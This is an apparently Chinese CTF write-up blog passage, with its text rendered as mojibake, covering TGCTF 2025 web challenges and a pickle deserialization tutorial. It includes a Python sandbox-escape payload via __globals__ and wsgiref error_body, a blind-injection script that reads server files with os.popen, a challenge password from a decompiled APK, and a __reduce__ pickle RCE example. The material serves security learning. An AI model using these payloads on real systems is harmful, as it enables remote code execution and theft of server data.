class="string">&quot;expr&quot;</span>: <span class="string">f&quot;exec(<span class="subst">&#123;code!r&#125;</span>)&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.status_code)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>

<h4 id="è„šæœ¬è§£é‡Š"><a href="#è„šæœ¬è§£é‡Š" class="headerlink" title="è„šæœ¬è§£é‡Š"></a>è„šæœ¬è§£é‡Š</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆé€šè¿‡ b = re.match.__globals__[&#x27;__builtins__&#x27;] è¿™ä¸€æ­¥æ˜¯é€šè¿‡åŠ è½½__globals__çš„å±æ€§è®¿é—®å…¨å±€ç©ºé—´ ç›®çš„æ˜¯ç»•è¿‡å¯¹__import__å’Œ__builtins__çš„é™åˆ¶ ç›¸å½“äºç»•è¿‡å¯¹è¿™ä¸ªçš„æ²™ç®±é™åˆ¶</span><br><span class="line"></span><br><span class="line">ç„¶å b[&quot;setattr&quot;](b[&#x27;__import__&#x27;](&#x27;wsgiref&#x27;).handlers.BaseHandler,&quot;error_body&quot; æ˜¯è¿‡__import__å‡½æ•°åŠ¨æ€åŠ è½½wsgirefæ¨¡å—wsgiref.handlers.BaseHandleræ˜¯WSGIå¤„ç†HTTPè¯·æ±‚/å“åº”çš„åŸºç±»ï¼Œè´Ÿè´£ç”Ÿæˆé”™è¯¯å“åº”å†…å®¹ã€‚</span><br><span class="line"></span><br><span class="line">b[&quot;__import__&quot;](&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read().encode() ç„¶åä¿®æ”¹ç±»çš„error_bodyå±æ€§ä¸ºå‘½ä»¤æ‰§è¡Œçš„å†…å®¹ ç„¶åencodeæ˜¯æŠŠå…¶è½¬åŒ–ä¸ºå­—èŠ‚ç±»å‹</span><br><span class="line"></span><br><span class="line">raise Exception(&quot;1&quot;)æ˜¯å¼ºåˆ¶æŠ›å‡ºå¼‚å¸¸ è§¦å‘WSGIæŠ¥é”™</span><br></pre></td></tr></table></figure>

<h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>é€šè¿‡æ•…æ„è§¦å‘ç¨‹åºä¸­çš„å¼‚å¸¸ï¼ˆé”™è¯¯ï¼‰ï¼Œåˆ©ç”¨å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸­çš„æ¼æ´æ‰§è¡Œæ¶æ„ä»£ç ã€‚ä¾‹å¦‚ï¼Œåœ¨åŠ¨æ€ä»£ç æ‰§è¡Œç¯å¢ƒï¼ˆå¦‚<code>eval</code>ï¼‰ä¸­ï¼Œæ”»å‡»è€…æ„é€ è¾“å…¥å¼•å‘å¼‚å¸¸ï¼ŒåŒæ—¶æ³¨å…¥æ¶æ„ä»£ç ã€‚</p>
<h4 id="åšé¢˜æ€è€ƒæ­¥éª¤ï¼š"><a href="#åšé¢˜æ€è€ƒæ­¥éª¤ï¼š" class="headerlink" title="åšé¢˜æ€è€ƒæ­¥éª¤ï¼š"></a>åšé¢˜æ€è€ƒæ­¥éª¤ï¼š</h4><ol>
<li><strong>è¾“å…¥æ„é€ </strong>ï¼šæäº¤åŒ…å«æ¶æ„ä»£ç çš„è¾“å…¥ï¼Œå¦‚<code>1 + &quot;a&quot;</code>å¼•å‘ç±»å‹é”™è¯¯ã€‚</li>
<li><strong>å¼‚å¸¸è§¦å‘</strong>ï¼šæœåŠ¡å™¨å¤„ç†è¾“å…¥æ—¶æŠ›å‡ºå¼‚å¸¸ï¼Œè¿›å…¥é”™è¯¯å¤„ç†æµç¨‹ã€‚</li>
<li><strong>ä»£ç æ³¨å…¥</strong>ï¼šåœ¨å¼‚å¸¸å¤„ç†è¿‡ç¨‹ä¸­ï¼Œæ¶æ„ä»£ç è¢«è§£ææ‰§è¡Œã€‚ä¾‹å¦‚ï¼Œé€šè¿‡<code>__import__(&#39;os&#39;).system(&#39;ls&#39;)</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</li>
<li><strong>ç»•è¿‡é™åˆ¶</strong>ï¼šåˆ©ç”¨åå°„æˆ–å†…ç½®å¯¹è±¡ï¼ˆå¦‚<code>__builtins__</code>ï¼‰ç»•è¿‡æ²™ç®±é™åˆ¶ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</li>
</ol>
<h4 id="æ³•2ï¼šå¸ƒå°”ç›²æ³¨"><a href="#æ³•2ï¼šå¸ƒå°”ç›²æ³¨" class="headerlink" title="æ³•2ï¼šå¸ƒå°”ç›²æ³¨"></a>æ³•2ï¼šå¸ƒå°”ç›²æ³¨</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">50</span>):</span><br><span class="line">    <span class="comment"># for s in &#x27;TGCTF&#123;&#x27;:</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> tqdm(<span class="string">&#x27;-&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+string.ascii_lowercase+string.digits):</span><br><span class="line">        data = &#123;<span class="string">&quot;expr&quot;</span>:<span class="string">f&quot;import os,operator;f=os.popen(&#x27;cat /f*&#x27;).read();a=int(operator.eq(f[<span class="subst">&#123;i&#125;</span>],&#x27;<span class="subst">&#123;s&#125;</span>&#x27;));1/a&quot;</span>&#125;</span><br><span class="line">        <span class="comment"># res = requests.post(url, data=json)</span></span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(res.text, s)</span></span><br><span class="line">        <span class="keyword">if</span> res.text != <span class="string">&quot;A server error occurred.  Please contact the administrator.&quot;</span>:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)s</span><br></pre></td></tr></table></figure>

<h4 id="æ³•3ï¼špyramidå†…å­˜é©¬"><a href="#æ³•3ï¼špyramidå†…å­˜é©¬" class="headerlink" title="æ³•3ï¼špyramidå†…å­˜é©¬"></a>æ³•3ï¼špyramidå†…å­˜é©¬</h4><p>æ¨èè¿™ç¯‡å¸ˆå‚…çš„æ–‡ç« æ <code>https://www.yuque.com/polestar-mzvgl/swtget/zuh78rfp7i67u219#AWd8j</code></p>
<p>ä¹Ÿå¯ä»¥çœ‹æˆ‘çš„åšå®¢å†…ç½®æ–‡ç«  <a target="_blank" rel="noopener" href="https://sauy122.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">https://sauy122.github.io/2025/04/16/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></p>
<h2 id="TG-wordpress"><a href="#TG-wordpress" class="headerlink" title="TG_wordpress"></a><strong>TG_wordpress</strong></h2><p>æœ‰å¾ˆå¤šæ¼æ´ç‚¹ æ²»ç†åªå†™ä¸€ç§</p>
<p>æ‰«æäºŒç»´ç ä¸‹ä¸‹æ¥ä¸€ä¸ªapkæ–‡ä»¶ jadxåç¼–è¯‘å å…¨å±€æœç´¢ password</p>
<p><img src="/images/image-20250415210925462.png" alt="image-20250415210925462"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;string name=<span class="string">&quot;web04&quot;</span>&gt;+ username/password:&lt;/string&gt;</span><br><span class="line">&lt;string name=<span class="string">&quot;web05&quot;</span>&gt;+ TG_wordpressor&lt;/string&gt;</span><br><span class="line">&lt;string name=<span class="string">&quot;web06&quot;</span>&gt;+ aXx^oV<span class="meta">@K</span>&amp;amp;cFoVaztQ*&lt;/string&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨&#x2F;loginè·¯ç”±ç™»å½• è¿›å…¥è¿‡å æŸ¥è¯¢æ’ä»¶ç¡®å®šcve çš„å‹å·(ä½ å¯ä¹Ÿç›´æ¥å¤åˆ¶æ’ä»¶çš„å†…å®¹ ç„¶åç›´æ¥é—®dp)</p>
<p>TGCTF{CVE-2020-25213}</p>
<h2 id="TGCTF-2025-åå°ç®¡ç†"><a href="#TGCTF-2025-åå°ç®¡ç†" class="headerlink" title="TGCTF 2025 åå°ç®¡ç†"></a><strong>TGCTF 2025 åå°ç®¡ç†</strong></h2><p>SQLæ³¨å…¥</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/2.png">
      <meta itemprop="name" content="Sauy">
      <meta itemprop="description" content="VENI,VEDI,VICI">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sauy's corner">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">pickleååºåˆ—åŒ–å­¦ä¹ </a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-04-10 16:10:58" itemprop="dateCreated datePublished" datetime="2025-04-10T16:10:58+08:00">2025-04-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-04-11 14:04:57" itemprop="dateModified" datetime="2025-04-11T14:04:57+08:00">2025-04-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><p>è¯¦ç»†å‰ç½®çŸ¥è¯†å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/pickle.html">https://docs.python.org/zh-cn/3/library/pickle.html</a></p>
<h3 id="Pickleâ€“Pythonå¯¹è±¡ååºåˆ—åŒ–"><a href="#Pickleâ€“Pythonå¯¹è±¡ååºåˆ—åŒ–" class="headerlink" title="Pickleâ€“Pythonå¯¹è±¡ååºåˆ—åŒ–"></a>Pickleâ€“Pythonå¯¹è±¡ååºåˆ—åŒ–</h3><h4 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pickleæ˜¯pythoné‡Œä¸€ä¸ªå¯ä»¥å¯¹ä¸€ä¸ª Python å¯¹è±¡ç»“æ„çš„äºŒè¿›åˆ¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ¨¡å—ã€‚</span><br><span class="line">&quot;pickling&quot; æ˜¯å°† Python å¯¹è±¡åŠå…¶æ‰€æ‹¥æœ‰çš„å±‚æ¬¡ç»“æ„è½¬åŒ–ä¸ºä¸€ä¸ªå­—èŠ‚æµçš„è¿‡ç¨‹ï¼Œè€Œ &quot;unpickling&quot; æ˜¯ç›¸åçš„æ“ä½œ</span><br><span class="line"></span><br><span class="line">pickelå¯ä»¥çœ‹ä½œä¸€ç§ç‹¬ç«‹çš„æ ˆè¯­è¨€ï¼Œå…¶å¯¹opcodeçš„ç¼–å†™å¯ä»¥è¿›è¡Œpythonä»£ç æ‰§è¡Œã€å˜é‡è¦†ç›–ç­‰æ“ä½œã€‚</span><br></pre></td></tr></table></figure>

<h4 id="pickleåºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#pickleåºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="pickleåºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>pickleåºåˆ—åŒ–å’Œååºåˆ—åŒ–</h4><p>å¯¹è±¡ &lt;â€“&gt; äºŒè¿›åˆ¶å­—èŠ‚æµ </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.age=<span class="number">18</span></span><br><span class="line">        <span class="variable language_">self</span>.name=<span class="string">&quot;A&quot;</span></span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)   //P.age æ˜¯è°ƒç”¨ageæˆå‘˜ P.name æ˜¯è°ƒç”¨nameæˆå‘˜</span><br></pre></td></tr></table></figure>

<p>pickle.dumpså°†å¯¹è±¡åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶å­—èŠ‚æµ</p>
<p>pickle.loadså°†äºŒè¿›åˆ¶å­—èŠ‚æµåŒ–ä¸ºå¯¹è±¡</p>
<h2 id="Pickleååºåˆ—åŒ–æ¼æ´"><a href="#Pickleååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Pickleååºåˆ—åŒ–æ¼æ´"></a>Pickleååºåˆ—åŒ–æ¼æ´</h2><p>æˆå› :å°±æ˜¯åœ¨<strong>äºŒè¿›åˆ¶å­—èŠ‚æµ</strong>ä¸Šåšæ‰‹è„š å°±åƒphpååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ¥è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®æ ‡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.age=<span class="number">18</span></span><br><span class="line">        <span class="variable language_">self</span>.name=<span class="string">&quot;A&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">r&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br></pre></td></tr></table></figure>

<p>ç‰¹æ®Šå‡½æ•°<code>__reduce__</code> return ä¸€ä¸ªå…ƒç»„ ç¬¬ä¸€ä¸ªæ˜¯å¯è°ƒç”¨å¯¹è±¡ ç¬¬äºŒä¸ªæ˜¯ä¸€ä¸ªå‚æ•°å…ƒç»„</p>
<p>åœ¨pickle.loadsçš„æ—¶å€™å°±ä¼šæ‰§è¡Œos.system(â€œwhoamiâ€) é‚£å°±æˆåŠŸæ‰§è¡Œä»»æ„pythonä»£ç äº†</p>
<h2 id="Pickleå·¥ä½œåŸç†"><a href="#Pickleå·¥ä½œåŸç†" class="headerlink" title="Pickleå·¥ä½œåŸç†"></a>Pickleå·¥ä½œåŸç†</h2><p>ç‹¬ç«‹çš„æ ˆè¯­è¨€ï¼Œç”±ä¸€ä¸²ä¸²opcodeç»„æˆã€‚è¯­è¨€è§£æä¾é Pickle Virtual Machine(PVM)è¿›è¡Œã€‚</p>
<ul>
<li>æŒ‡ä»¤å¤„ç†å™¨ï¼šä»æµä¸­è¯»å– <code>opcode</code> å’Œå‚æ•°ï¼Œå¹¶å¯¹å…¶è¿›è¡Œè§£é‡Šå¤„ç†ã€‚é‡å¤è¿™ä¸ªåŠ¨ä½œï¼Œç›´åˆ°é‡åˆ° . è¿™ä¸ªç»“æŸç¬¦ååœæ­¢ã€‚ æœ€ç»ˆç•™åœ¨æ ˆé¡¶çš„å€¼å°†è¢«ä½œä¸ºååºåˆ—åŒ–å¯¹è±¡è¿”å›ã€‚</li>
<li>stackï¼šç”± Python çš„ <strong><code>list</code></strong> å®ç°ï¼Œè¢«ç”¨æ¥ä¸´æ—¶å­˜å‚¨æ•°æ®ã€å‚æ•°ä»¥åŠå¯¹è±¡ã€‚</li>
<li>memoï¼šç”± Python çš„ <strong><code>dict</code></strong> å®ç°ï¼Œä¸º PVM çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæä¾›å­˜å‚¨ã€‚</li>
</ul>
<p><img src="D:\Blog\source\images\v2-5e2eeae4c4943c31aee406fa3b467301_720w.png"></p>
<h3 id="å¸¸ç”¨opcodeæŒ‡ä»¤"><a href="#å¸¸ç”¨opcodeæŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨opcodeæŒ‡ä»¤"></a>å¸¸ç”¨opcodeæŒ‡ä»¤</h3><table>
<thead>
<tr>
<th align="left">æŒ‡ä»¤</th>
<th align="center">æè¿°</th>
<th align="center">å…·ä½“å†™æ³•</th>
<th align="center">æ ˆä¸Šçš„å˜åŒ–</th>
</tr>
</thead>
<tbody><tr>
<td align="left">c</td>
<td align="center">è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—</td>
<td align="center">c[module]\n[instance]\n</td>
<td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">o</td>
<td align="center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td>
<td align="center">o</td>
<td align="center">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">i</td>
<td align="center">ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td>
<td align="center">i[module]\n[callable]\n</td>
<td align="center">è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">N</td>
<td align="center">å®ä¾‹åŒ–ä¸€ä¸ªNone</td>
<td align="center">N</td>
<td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">S</td>
<td align="center">å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td>
<td align="center">Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td>
<td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">V</td>
<td align="center">å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td>
<td align="center">Vxxx\n</td>
<td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">I</td>
<td align="center">å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td>
<td align="center">Ixxx\n</td>
<td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">F</td>
<td align="center">å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td>
<td align="center">Fx.x\n</td>
<td align="center">è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">R</td>
<td align="center">é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td>
<td align="center">R</td>
<td align="center">å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">.</td>
<td align="center">ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td>
<td align="center">.</td>
<td align="center">æ— </td>
</tr>
<tr>
<td align="left">(</td>
<td align="center">å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td>
<td align="center">(</td>
<td align="center">MARKæ ‡è®°å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">t</td>
<td align="center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td>
<td align="center">t</td>
<td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">)</td>
<td align="center">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td>
<td align="center">)</td>
<td align="center">ç©ºå…ƒç»„å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">l</td>
<td align="center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td>
<td align="center">l</td>
<td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">]</td>
<td align="center">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td>
<td align="center">]</td>
<td align="center">ç©ºåˆ—è¡¨å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">d</td>
<td align="center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td>
<td align="center">d</td>
<td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">}</td>
<td align="center">å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td>
<td align="center">}</td>
<td align="center">ç©ºå­—å…¸å…¥æ ˆ</td>
</tr>
<tr>
<td align="left">p</td>
<td align="center">å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td>
<td align="center">pn\n</td>
<td align="center">æ— </td>
</tr>
<tr>
<td align="left">g</td>
<td align="center">å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td>
<td align="center">gn\n</td>
<td align="center">å¯¹è±¡è¢«å‹æ ˆ</td>
</tr>
<tr>
<td align="left">0</td>
<td align="center">ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td>
<td align="center">0</td>
<td align="center">æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td>
</tr>
<tr>
<td align="left">b</td>
<td align="center">ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td>
<td align="center">b</td>
<td align="center">æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td>
</tr>
<tr>
<td align="left">s</td>
<td align="center">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td>
<td align="center">s</td>
<td align="center">ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td>
</tr>
<tr>
<td align="left">u</td>
<td align="center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td>
<td align="center">u</td>
<td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td>
</tr>
<tr>
<td align="left">a</td>
